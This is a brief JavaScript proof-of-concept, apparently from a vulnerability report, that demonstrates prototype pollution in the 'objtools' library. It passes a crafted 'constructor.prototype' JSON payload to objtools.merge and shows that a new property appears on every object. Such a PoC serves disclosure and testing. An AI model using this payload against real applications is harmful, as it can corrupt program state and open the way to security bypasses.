const objtools = require('objtools');
const payload = JSON.parse('{"constructor": {"prototype": {"polluted":"yes"}}}');
obj = {};
console.log({}.polluted);
objtools.merge({}, payload);
console.log({}.polluted);